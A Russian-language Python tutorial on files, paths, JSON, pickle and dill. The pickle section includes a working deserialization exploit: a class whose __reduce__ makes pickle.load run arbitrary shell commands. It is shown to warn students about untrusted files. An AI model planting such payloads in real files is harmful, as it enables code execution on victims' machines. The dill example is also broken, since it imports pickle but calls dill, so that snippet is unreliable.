### Файлы в Python

#### Открытие файла

Прежде чем начать что-то делать с файлом, нужно его открыть, т.е. загрузить в оперативную память под некоторым именем - переменной, через которую мы будем в дальнейшем к нему обращаться. Обратите внимание: имя файла и имя переменной - это не одно и то же! В качестве имени переменной иногда используется само слово file, но чтобы не путать его с параметром file некоторых функций, лучше задавать другое имя, например, букву f.

Файл открывается командой open. Самый часто употребимый вид команды open такой:

    f = open(path, mode, encoding)

Эта команда создает объект класса IOWrapper, у которого есть методы чтения, записи и закрытия. Path - это путь к файлу, единственный обязательный аргумент.

Пути к файлам бывают абсолютные и относительные. Абсолютный путь включает в себя все от корня (буквы диска в windows, папки home в Linux). Относительный - только часть пути, которая начинается от той папки, в которой мы в данный момент находимся (по умолчанию это папка скрипта, но можно перейти в другую). Если файлов, с которыми работает скрипт, много и/или они постоянные, удобнее использовать относительные пути, а сами файлы просто переносить вместе со скриптом при его копировании. Обычно в таких случаях в папке скрипта создается подпапка с названием 'files' или подобным. В иных случаях используйте абсолютные пути.

- В Windows в путях файлов используется бекслеш \. Поскольку все аргументы в open передаются в виде строк, питон будет пытаться искать эскейп-последовательности (такие, как \n). Чтобы этого избежать, можно либо вручную экранировать слеши: \, либо просто писать буковку r перед строкой: так называемые raw-строки читаются as is.

- В юниксовых системах (MacOS, Linux) такой проблемы нет, потому что там используются прямые слеши /.

Посмотрите на демо, которое я вам показывала на семинаре. Заметьте, что все работает так же, если заменить везде код

    open(r'usr/f.txt')

на

    open('usr//f.txt')

Только нужно не забыть для начала загрузить нужный файл в папку usr!

```python
from os import chdir as cd

cd('..')
with open('usr//f.txt', 'r', encoding='utf-8', errors='replace') as f:
    print(f.read())
```

В Python есть несколько режимов, в каких можно открывать файл. Нам пригодятся три самых распространенных:

- r - режим чтения
- w - режим записи (стирает старое содержимое файла)
- a - режим записи с дополнением (сохраняет старое содержимое файла, дописывает в конец)

Помимо режимов есть модификаторы, которые используются вместе с режимами.

- '+' — открыть для чтения и записи одновременно (например, 'r+', 'w+').

- 'b' — двоичный (binary) режим. Используется для картинок, аудио или байт-строк (например, 'rb', 'wb').

- 't' — текстовый режим. Установлен по умолчанию (то есть 'rt' означает то же, что и просто 'r')

**Примечание:** Отличие режимов 'r+' и 'a' друг от друга состоит в том, что в 'r+' начальная позиция указателя - в самом начале файла, тогда как в 'a' указатель изначально стоит в конце.

По умолчанию, если не указать режим, будет 'r'. Если файл не существует, то режим 'r' выдает ошибку, а режимы 'w' и 'a' создаlen новый пустой файл с таким именем. (C 'r+' и 'w+' здесь дело обстоит ровно так же, как с обычными 'r' и 'w', соответственно.)

Наконец, аргумент encoding тоже передается строкой и содержит название кодировки. Пользователям windows предлагается по умолчанию всегда прописывать encoding='utf8', потому что юникод - самая удобная кодировка, особенно для лингвистов.

Итак, открываем несуществующий файл:

```python
f = open('test.txt', 'w', encoding='utf8')
f.close()
```

Не забудьте, что файлы нужно всегда за собой закрывать! Даже если вы только из них читаете, не забудьте выполнить команду

    f.close()

Иначе ваш файл останется болтаться открытым в оперативке.

Чтобы не закрывать файл вручную, можно (и хорошо) использовать контекстный менеджер with, который сам закроет файл, когда закончит с ним работу.

```python
with open('test.txt', 'w', encoding='utf8') as f:
    pass # тут может быть сколько угодно команд для работы с файлом, главное сохранять отступ
```

Теперь о том, как правильно читать и записывать в файл.

Как читать:

1. f.read() - считает **все** содержимое файла, вернет его одной длиннющей строкой, в которой будет много \\n.
2. f.readlines() - считает **все** содержимое файла, вернет его списком строк. В конце каждой строки, кроме последней, будет прилеплен \\n.
3. f.readline() - считает **одну строчку** из файла, вернет ее, собственно, строчкой. То же про конец строки и \\n.
4. for line in f: ... - будет считывать по **одной строчке** из файла, пока не дойдет до конца.

Лучше всего использовать способ 4 для объемных файлов. В противном случае вы, например, загружаете гигабайтовый текстовый файл в оперативную память махом, и ноутбук превращается в тыкву...

Как писать:

1. f.write('...') - записывает одну строчку в файл. НЕ ставит \\n в ее конце. Возвращает количество записанных символов.
2. f.writelines(['...', '...', '...']) - записывает список строк в файл. Тоже не ставит \\n.
3. print(whatever, file=f) - самый понтовый способ, потому что автоматически ставит \\n и использует все возможности принта.  

Чтобы записанная информация сохранилась в файл, необходимо его также закрыть.

Попробуем записать несколько строк в наш созданный файл и затем считать их.

```python
f = open('test.txt', 'w', encoding='utf8')

f.write('Hello world! ')
print('\nА это принт напринтил', file=f)
f.writelines([word + '\n' for word in "список слов для разделения на строки".split()])  # здесь я вручную прилепила \n каждому слову

f.close()
```

```python
f = open('test.txt', 'r', encoding='utf8')

for line in f:
    print(line.rstrip())  # rstrip нужен, чтобы откусить \n

f.close()
```

#### Работа с файловой системой

Открывать, читать/писать и закрывать файлы питон умеет сам; но для того, чтобы создавать папки, удалять папки и файлы и работать с путями, нужен какой-нибудь модуль. Самый простой модуль, который мы с вами обсуждали - это модуль os.

Какие команды этого модуля мы знаем?

- os.getcwd() - возвращает строку, представляющую текущий рабочий каталог;
- os.listdir(path) - принимает на вход путь к папке (path), возвращает перечень всего, что в ней есть, в виде списка строк;
- os.remove(path) - удаляет файл навсегда;
- os.rmdir(path) - удаляет папку;
- os.mkdir(path) - создает папку (но если не существует какой-то папки в пути до названия новой папки, то не получится);
- os.makedirs(path) - создает папку и все промежуточные несуществующие (например, если я захочу в текущем каталоге завести папку test, а в ней папку texts, то эта функция сделает ровно то, что надо).

И еще есть команды os.path:

- os.path.exists(path) - проверяет, существует ли такой путь. Вернет True/False.
- os.path.isdir(path) - проверяет, является ли путь папкой.
- os.path.isfile(path) - проверяет, является ли путь файлом.
- os.path.isabs(path) - проверяет, является ли путь абсолютным (т.е., начинается с буквы диска в Windows или со слова home в юниксовых системах).
- os.path.abspath(path) - возвращает абсолютный путь по относительному.
- os.path.splitext(path) - делит путь на все, что идет до расширения, и расширение. Возвращает кортеж из двух элементов, в котором второй элемент может быть, н-р, '.txt'.
- os.path.split(path) - делит путь на название файла (вместе с расширением) и все остальное.
- os.path.join(path1, path2...) - объединяет несколько строк в один путь. Не умеет работать с буквой диска (т.е., не получится правильно объединить 'C:' и 'Python'). Учитывает особенности системы.

Также есть модуль pathlib для продвинутой работы с путями. Отличие этого модуля состоит в том, что там путь представляет собой объект, а не строку, поэтому не нужно мучиться с разными слешами. Можно писать прямые слеши даже на Windows! Также пути в pathlib можно склеивать с помощью обычного знака деления / в коде. Это выглядит естественно и легко читается.



```python
from pathlib import Path

base_path = Path("C:/Users/Student/Project")  # Задаем базовый путь к папке с нашим проектом

file_path = base_path / "data" / "users.csv" # Склеиваем полный путь из базового пути, имени подпапки с данными проекта и имени файла

print(file_path)
```

Чтобы быстро усвоить основные преимущества pathlib, можно использовать шпаргалку по атрибутам пути на примере пути к только что созданному файлу:

- .name — полное имя файла (users.csv);
- .stem — имя без расширения (users);
- .suffix — только расширение (.csv);
- .parent — папка, в которой лежит файл (C:/Users/Student/Project/data);
- .exists() — проверка, существует ли файл (возвращает True/False, в данном случае будет True).



### Форматы файлов, сериализация

Файлы, которые умеет обрабатывать питон, находятся на своего рода шкале по человекочитаемости:

1. .txt файлы - легко читаются человеком, трудно читаются скриптами (потому что не структурированы)
2. .json, .csv файлы - могут читаться как человеком, так и машиной
3. бинарные файлы - не предназначены для чтения человеком

Работать с обычными текстовыми файлами мы с вами уже умеем и научимся это делать еще виртуознее, когда освоим регулярные выражения. Теперь посмотрим другие форматы.

#### JSON

json - Java Script Object Notation; первоначально создавался для другого ЯП, но может быть использован и для типов питона. Это такой формат, в котором объекты питона записываются в машиночитаемом виде, но при этом могут читаться и человеком. Запись данных в машиночитаемом виде называется сериализацией: когда мы считываем такие файлы снова программой, не нужно их специально парсить (явно для человека).

Основное преимущество формата json в том, что он простой, его понимают все языки программирования (Python, JavaScript, Java, Go). Если нужно отправить данные на сайт или сохранить настройки — мы используем этот формат. Но на нем сложно выразить специфические «диалекты» Python, например, функции или кастомные классы. Он умеет работать только с базовыми классами (словари, списки, строки, числа, логические типы и None).

С json-файлами работает модуль json, который является стандартным модулем из библиотек питона.

Нам для работы достаточно знать четыре функции этого модуля:

- json.dumps(object) - сериализует объект питона в строку json;
- json.loads(string) - наоборот, десереализует строку в объект;
- json.dump(object, file) - сохраняет объект в файл,
- json.load(file) - загружает файл.

Посмотрим, как все это работает.

Как вы видите, json читается человеком так же легко, как исходный объект.

Однако есть один нюанс в использовании json.dumps(object) и json.dump(object, file). Если у вас объект с кириллическим текстом внутри, то при сериализации его в json-строку данные могут потерять читаемость. Чтобы этого не было, используйте дополнительный параметр ensure_ascii=False. Этот параметр определяет, как Python будет записывать не-английские символы. По умолчанию он равен True и превращает все русские буквы в экранированные ASCII-коды (вроде \u043f).

```python
import json

second_data = {"name": "Катя", "age": 15, "is_student": False}

with open("data.json", "w", encoding="utf-8") as fout:
    json.dump(second_data, fout, ensure_ascii=False, indent=4) # Записываем в json-файл кириллицу

with open("data.json", "r", encoding="utf-8") as fin:
    gotten_data = json.load(fin) # Используем здесь собственный метод чтения json, чтобы посмотреть, как он работает с нашим файлом

print(gotten_data)
```

Помните, что, если используете ensure_ascii=False при сохранении файла, необходимо явно указывать кодировку encoding='utf-8' в функции open(). Иначе на Windows вы получите ошибку или кракозябры.

####Pickle

Что если мы хотим сохранить не словарь, а настоящий объект класса или даже функцию? json.dumps(my_class_instance) выдаст ошибку TypeError.

Тут на сцену выходит бинарное представление данных (данные как набор байтов). Есть несколько бинарных форматов для разных задач, но пока мы рассмотрим только  pickle (в переводе — «консервировать/мариновать»).

В отличие от универсального формата json, формат pickle - это "внутренний сленг", который понимает *только* Python. На нем можно легко и быстро сохранить абсолютно любой объект Python, даже самый сложный (модель машинного обучения, открытое соединение, кастомный класс). Но ни человек, ни другие языки программирования этот файл прочитать не смогут.

Для работы с этим форматом в Python есть стандартная библиотека pickle. Основные функции этой библиотеки аналогичны функциям библиотеки json.

Посмотрим работу с pickle на примере того же словаря.

```python
import pickle

data = {"name": "Катя", "age": 15, "is_student": False}

with open("data.pickle", "wb") as fout:
    pickle.dump(data, fout) # Для записи в pickle-файл не нужно указания никаких дополнительных параметров, потому что это байты

with open("data.pickle", "rb") as fin:
    gotten_data = pickle.load(fin)

print(gotten_data)
```

Еще одна особенность pickle состоит в том, что этот формат может быть опасен при загрузке чужих файлов. Поскольку в нем могут храниться объекты кастомных классов и функции, декодирование непроверенных файлов этого формата может привести к повреждению ваших данных.

Ниже приведен пример потенциально вредоносного кода с использованием pickle.

```python
import pickle

class Exploit: # Создаем кроссплатформенный класс-ловушку
    def __reduce__(self):
        # Метод __reduce__ возвращает кортеж (функция, которую нужно вызвать, (кортеж аргументов для нее))
        payload = (# Пишем кроссплатформенную функцию, которая выполнит любой переданный ей текст как
                   # полноценный Python-код в момент десериализации.
            "import os\n"
            "try:\n" # Оператор, позволяющий выполнить потенциально ошибочный код
            "    os.system('calc.exe')\n"  # Пробуем Windows (откроет Калькулятор)
            "except Exception:\n" # Ничего не делаем, если не вышло
            "    pass\n"
            "try:\n" # Пробуем macOS (откроет Калькулятор)
            "    os.system('open -a Calculator')\n"
            "except Exception:\n" # Опять ничего не делаем, если не вышло
            "    pass\n"
            "try:\n" # Пробуем Linux (выведет громкое предупреждение в терминал)
            "    os.system('echo \"=== ВНИМАНИЕ: ВАШ КОМПЬЮТЕР УЯЗВИМ! ===\"')\n"
            "except Exception:\n"
            "    print('Что-то пошло не так, ловушка не сработала')"
        )
        # Возвращаем функцию exec и нашу строку с кодом в качестве аргумента.
        # В момент pickle.load() Python выполнит exec(payload)
        return (exec, (payload,))

# Создаем объект класса
bad_object = Exploit()

with open("data.pkl", "wb") as fexp:
     pickle.dump(bad_object, fexp) # Записываем объект в файл pickle
print("Файл data.pkl успешно 'отравлен' и готов к отправке!")
```

Как вы видите, мы можем упаковать в pickle объект, выполняющий любой код на вашем компьютере. Так что будьте очень внимательны с pickle-файлами из внешних источников! Из интернета лучше вообще их не качать, используйте в таких случаях json.

##Dill

Несмотря на свои устрашающие возможности, pickle на самом деле довольно ленив. Он не сохраняет код класса или функции, он сохраняет только название и данные.Если вы попытаетесь передать через pickle:\

- Лямбда-функцию;
- Вложенную функцию;
- Текущую сессию интерпретатора (все созданные переменные разом);

...то pickle выдаст ошибку. Для него это «непиклируемые» (unpicklable) объекты.

Решением в этом случае будет dill — библиотека, которая названа в честь укропа, который используется при классическом мариновании огурцов:)

У dill есть функции, способные сериализовать код других функций, замыкания, генераторы и даже состояние самого интерпретатора.

Для сравнения возможностей pickle и dill посмотрите следующий код.

```python
# Тестируем pickle
import pickle

# Создаем лямбда-функцию
square = lambda x: x ** 2

# Пробуем упаковать ее в pickle
pickle.dumps(square)
```

```python
# Тестируем dill
import pickle

# Создаем лямбда-функцию
square = lambda x: x ** 2

# dill справляется с упаковкой без проблем!
serialized_lambda = dill.dumps(square)

# Восстанавливаем функцию в другой переменной
my_func = dill.loads(serialized_lambda)

# Проверяем работоспособность
print(my_func(5))
```

Как видите, dill может (почти) все!

Конечно, в реальности вам довольно редко придется (если придется) использовать такие функции, которых нет в pickle, но знать о них полезно. И поскольку у библиотек pickle и dill синтаксис практически одинаковый, вы всегда сможете перейти от первой ко второй, не залезая в справочные материалы.
